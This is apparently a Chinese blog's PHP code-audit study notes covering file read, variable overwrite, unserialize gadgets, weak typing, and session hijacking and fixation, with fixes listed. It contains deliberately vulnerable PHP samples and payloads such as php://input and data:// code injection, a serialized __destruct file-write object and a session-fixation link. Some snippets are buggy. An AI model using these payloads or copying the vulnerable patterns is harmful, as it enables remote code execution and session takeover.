<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($filename))&#123;</span><br><span class="line"><span class="number">1.</span>  readfile($filename);		<span class="comment">//目录穿越一波？</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>  $fp = fopen($filename,mode=<span class="string">'r'</span>) <span class="keyword">or</span> (<span class="string">"fail"</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;					<span class="comment">//感觉跟文件包含差不多23333,文件包含是利用，文件读取就读内容</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>  <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者可以将路劲遍历序列放入文件名内，从当前位置向上回溯，从而浏览整个浏览器的任何文件</p>
<p>任意文件删除</p>
<p>unlink()函数</p>
<p>同任意文件读取，函数不同而已。</p>
<p>修复方案：</p>
<ol>
<li><p>正则严格判断用户输入参数的格式</p>
</li>
<li><p>检查使用者的文件名是否有“..”的目录阶层字符</p>
</li>
<li><p>在php.ini文件中设置open_basedir来限定文件访问的范围</p>
</li>
</ol>
<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>结合其他漏洞攻击，覆盖白名单，控制没覆盖的未初始化变量导致SQL</p>
<p>常见危险函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">extract</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">parse_str</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">import_request_variables</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>常见的遍历方式释放代码可能导致变量覆盖漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value)&#123;</span><br><span class="line">		$$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>前提：register_globals = Off，（？为啥这么要求嘞，待解决）</p>
<p>extract()变量覆盖</p>
<p>int extract($array,extract_rules,prefix)</p>
<p>$array 关联的数组，受后面参数影响</p>
<p>extract_rules 对待非法/数字和冲突的键名的方法将根据取除标记</p>
<p>prefix 仅在第二个参数特殊时需要，添加前缀</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563369370804.png" alt="1563369370804"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract函数用来将一个数字分解成多个变量直接使用，下面是W3C的解释：PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。第二个参数<span class="built_in"> type </span>用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。本函数返回成功设置的变量数目。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">'pwd'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'username'</span>=&gt;<span class="string">'username'</span>,</span><br><span class="line">	<span class="string">'password'</span>=&gt;<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'rand'</span> =&gt; <span class="string">'rand'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">extract($arr,EXTR_PREFIX_SAME,<span class="string">"pwd"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$usename,$password,$rant"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">","</span>.$pwd_password;  </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>“EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。”</strong></p>
<p>EXTR_IF_EXISTS 似乎同上</p>
<p>parse_str()变量覆盖</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> parse_str(<span class="built_in">string</span> $encoded_string<span class="meta">[</span>,<span class="built_in">array</span> $result<span class="meta">]</span>)</span><br></pre></td></tr></table></figure>

<p>$encoded_string 输入的字符串</p>
<p>$result 变量将以数组元素的形式存入到这个数组，作为替代</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个很暴力</span><br><span class="line">$a = b</span><br><span class="line">parse_str($a = <span class="string">'n'</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>

<p>import_request_variables()</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variable(<span class="built_in">string</span> $type[,<span class="built_in">string</span> $prefix])</span><br></pre></td></tr></table></figure>

<p>$type 指定需要导入的变量，可用字母G,P,C代表GET POST COOKIE</p>
<p>$prefix    变量名前缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'0'</span>;</span><br><span class="line">import_request_varibles(<span class="string">'G'</span>);	<span class="comment">//相当于开启全局变量注册</span></span><br><span class="line"><span class="keyword">if</span>($a = <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;?a=<span class="number">1</span>             <span class="comment">#变量覆盖成功</span></span><br></pre></td></tr></table></figure>

<p>修复方案</p>
<ol>
<li>在php.ini文件设置register_globals=Off</li>
<li>使用原始变量数组，如$_POST,$_GET等数组变量进行操作</li>
<li>不使用foreach语句来遍历$_GET变量，而改用[(index)]来制定  （？还是不懂，觉得上面的案例是$$的，待解决）</li>
<li>注册变量前先判断变量是否存在，（就是不用extract这个函数了呗）</li>
</ol>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>序列化：把对象转换为字节序列的过程，成为对象的序列化</p>
<p>反序列化：把字节序列恢复为对象的过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test1=<span class="string">"SQYY 1028"</span>;</span><br><span class="line">$test2=<span class="keyword">array</span>(<span class="string">"SQYY"</span>,<span class="number">1028</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($test1);			&gt;s:<span class="number">9</span>:<span class="string">"SQYY 1028"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($test2);			&gt;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"SQYY"</span>;i:<span class="number">1</span>;i:<span class="number">1028</span>;&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>漏洞成因</p>
<p>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，</p>
<p>漏洞根据不同的代码可以导致各种攻击，如代码注入，SQL注入、目录遍历等等</p>
<p>序列化的不同结果：1. public 2. private 3. protect</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&gt;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">"testtest1"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">8</span>:<span class="string">"*test3"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞本质</p>
<p>unserialize函数的变量可控</p>
<p>php文件中存在可利用类，类中有魔术方法</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563373599421.png" alt="1563373599421"></p>
<p>导致代码执行的漏洞( __destruct() )</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct<span class="comment">()</span> 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a = <span class="string">'test'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"E:\\Local Test\www\hello.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">        fputs($fp,<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line">$obj = unserialize($_POST[<span class="string">'obj'</span>]);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"E:\\Local Test\www\hello.php"</span>;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">post:</span>obj=<span class="string">O:</span><span class="number">1</span>:<span class="string">"A"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">1</span>:<span class="string">"a"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"&lt;?php&gt; phpinfo();?&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>因为反序列化obj时，执行了魔术方法，__destruct(),从而引发了文件写入；</p>
<p>漏洞成因，存在魔术方法，魔术方法中的a可控，</p>
<p>防御思路：不用魔术方法，或者使得魔术方法中的变量、代码 用户不可控。</p>
<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>标准类型：布尔、整型、浮点、字符串</p>
<p>复杂类型：数组、对象</p>
<p>特殊类型：资源 resource</p>
<ol>
<li><p>字符串和数字比较：字符串第一个不为数字前的数字为字符串的值</p>
</li>
<li><p>数字、字符串 和 数组比较，永假</p>
</li>
<li><p>科学计数法的比较，同第一条</p>
</li>
<li><p>==弱类型，===强类型</p>
</li>
</ol>
<p>empty()：变量为0，”0“，null，‘’，false，array()，返回ture</p>
<p>isset：变量未定义或者为null时，返回false</p>
<p>md5</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> md5(<span class="built_in">string</span> $str[,boo $raw_output = <span class="literal">false</span>])</span><br></pre></td></tr></table></figure>

<p>绕过：传入数组（非字符串），返回为NULL</p>
<p>函数strcmp</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">strcmp</span>(<span class="keyword">string</span> $str1, <span class="keyword">string</span> $str2)</span><br></pre></td></tr></table></figure>

<p>绕过，传入数组（非字符串），返回为0    （字符相同返回为0）</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563416371109.png" alt="1563416371109"></p>
<p>switch    会将参数转化为整型，（ ‘67sfajf ’  -&gt;  67 ）</p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>file:// 协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>执行文件内容</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=<span class="keyword">file</span>://E:Local <span class="keyword">Test</span>\WWW\<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>

<p>php://filter</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<p>读取文件内容，base64编码</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=conver.base64-encode/resource=./<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>

<p>php://input 可以访问请求的原始数据的只读流</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="built_in">file</span>.php?<span class="built_in">file</span>=php://input</span><br><span class="line"><span class="built_in">post</span>:<span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>写入文件:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="built_in">file</span>.php?<span class="built_in">file</span>=php://input</span><br><span class="line"><span class="built_in">post</span>:<span class="meta">&lt;?</span>php fputs(fopen(<span class="string">"1.txt"</span>,<span class="string">"w"</span>),<span class="string">"1234"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>(觉着就是，执行你post的代码，还认为你post的代码是从文件中提取出来的)</p>
<p>data://协议</p>
<p>allow_url_fopen   :  on</p>
<p>allow_url_include   :  on</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data://<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">http</span>://localhost/test.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p>zip://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/test.php?file=zip:/</span><span class="regexp">/D:/</span>phpStudy<span class="regexp">/WWW/</span>txf.zip%<span class="number">23</span>txf.txt</span><br></pre></td></tr></table></figure>

<p>bzip2://协议</p>
<p>allow_url_fopen   :  off/on</p>
<p>allow_url_include   :  off/on</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/test.php?file=compress.zlib:/</span><span class="regexp">/./</span>txf.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563417336599.png" alt="1563417336599"></p>
<p>phar://伪协议</p>
<p>首先我们要用phar类打包一个phar标准包</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest2.zip'</span>, <span class="number">0</span>,<span class="string">'phartest2'</span>,Phar::ZIP) ; </span><br><span class="line">$x=file_get_contents(<span class="string">'./php.php'</span>);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'a.jpg'</span>, </span><br><span class="line">$x); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>会生成一个zip的压缩文件。然后我们构造</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/file.php?file=phar:/</span><span class="regexp">/php.zip/</span>php.jpg</span><br></pre></td></tr></table></figure>

<p>也可以直接shell</p>
<p>其中phar适用范围为php&gt;5.3.0</p>
<p>以下的这种包含方式在这样的情况下是无效的。</p>
<p>include(一个规定的路径+可控点)            (?没太理解，待解决)</p>
<h3 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h3><p>Session 固定动机</p>
<p>Session 劫持攻击</p>
<p>挖掘经验</p>
<p>遇到的比较多的就是出现在cookie验证上，通常是没有使用session来认证，直接将用户信息保存在cookie中</p>
<p>劫持攻击</p>
<p>劫持目标用户的session id来获取网站服务器上未经许可的存取信息，窃取目标用户等cookie数据，来取得网站的认可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_POST[&apos;login&apos;]))&#123;</span><br><span class="line">	$username = $_POST[&apos;username&apos;];</span><br><span class="line">    $password = $_POST[&apos;password</span><br><span class="line">    $con = 	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&apos;admin&apos;,$conn);</span><br><span class="line">	$sql = &quot;SELECT* FROM admin WHERE username =&apos; &quot;.$_username.&quot;&apos;&quot;;</span><br><span class="line">	$request = mysql_query($sql) or die(&quot;fail&quot;).mysql_error();</span><br><span class="line">	if($row = mysql_num_rows($result))&#123;</span><br><span class="line">    $_SESSION[&apos;username&apos;]=$username;</span><br><span class="line">    $_SESSION[&apos;password&apos;]=$password;</span><br><span class="line">    $_SESSIon[&apos;book&apos;] = 1;</span><br><span class="line">    header(&quot;localhost:http//127.0.0.1/member.php?user=&quot;.$username);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form method = &apos;post&apos; name=&apos;form&apos;&gt;</span><br><span class="line">            账号：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;</span><br><span class="line">            密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;</span><br><span class="line">            &lt;input type = &quot;submit&quot; name=&apos;login&apos;/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_GET[<span class="string">'user'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于回显了session_id，</p>
<p>攻击脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'session_id '</span>. session_id().<span class="string">"&lt;br/ &gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'name: '</span>. $_SESSION[<span class="string">'username'</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"book_num"</span>. $_SESSION[<span class="string">'book'</span>]=<span class="number">2000.</span><span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:/attak.php?<span class="attribute">PHPSESSIONID</span>=jdisoay8hdsiaf8yqr89fu39</span><br></pre></td></tr></table></figure>

<p>由于id的泄露，导致攻击者更改了该事件中的book数量。</p>
<p>修复方案：</p>
<ol>
<li>使用随机而且长度够大的数字或字符串来充当session_id</li>
<li>将网页之间传递的数据使用某种形式进行封装，特别是session_id</li>
<li>更改session名称</li>
<li>注销后即销毁session的所数据</li>
</ol>
<p>Session固定攻击</p>
<p>黑客固定住目标用户的session_id，因此目标用户所使用的session可有攻击者指定</p>
<p>（即目标用户用了黑客的session存取数据，黑客再用该session，读取目标的数据）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">有这么一个场景，当管理员登陆之后，程序生成一个认证session，而此时的session是没有指定session_id的。如果存在一个接口能够让我们指定session_id，那么我们就可以在设置一个session_id连接到这个已经认证的session上去。</span><br><span class="line"></span><br><span class="line">构造一个请求设置session_id的链接让管理员点击，那么我们就拥有了管理员的权限。（CSRF）</span><br><span class="line"></span><br><span class="line">在攻击成功之后，怎么设置我们的session_id呢？</span><br><span class="line"></span><br><span class="line">其实就是我们前端经常看到的这个东西。</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHPSESSID</span>=fdpmos0quo6o7rq69h6v1u6i50;</span><br><span class="line">攻击成功之后，设置<span class="attribute">PHPSESSID</span>=你自己设置的session_id，然后带着这个cookie请求即可访问后台。</span><br></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求后台任意需要认证的页面都是会调用session()方法，而且sessionid的接收是REQUEST方式，那么我们只要让登陆后台的管理员点击类似这样的链接，就可以拿到后台的权限了。</span><br><span class="line"></span><br><span class="line">http://demo.yxcms.<span class="keyword">com</span>/<span class="built_in">index</span>.php?r=admin/<span class="built_in">index</span>/<span class="built_in">index</span>&amp;sessionid=<span class="number">123</span>test</span><br><span class="line"></span><br><span class="line">要让管理员登陆状态下点你的链接，最好的方法是找到个后台的xss啦。</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://xz.aliyun.com/t/2025" target="_blank" rel="noopener">https://xz.aliyun.com/t/2025</a></p>
<p>修复方案</p>
<ol>
<li><p>不要从GET/POST变量中接受session_id</p>
</li>
<li><p>调用session_start函数后，立即生成新的session_id，并删除就得session</p>
</li>
<li><p>将session_id存放在cookie内</p>
</li>
<li><p>注销后即销毁session的所有数据</p>
</li>
<li><p>使用时间戳来记录session的使用时间，如果两次session的相差时间太长，就销毁session的所有数据</p>
</li>
<li><p>检查用户的ip地址，如果ip地址改变就产生新的session_id</p>
<p>且删除旧的session</p>
</li>
</ol>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/14/赛博杯2019_Write_Up/">
                赛博杯2019_Write_Up
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-14</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="赛博杯2019-Write-Up"><a href="#赛博杯2019-Write-Up" class="headerlink" title="赛博杯2019 Write Up"></a>赛博杯2019 Write Up</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杭电赛博协会出得题，感觉质量还是不错的，难易兼备。以下是比赛题目部分Write Up。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/1.png" alt="1"></p>
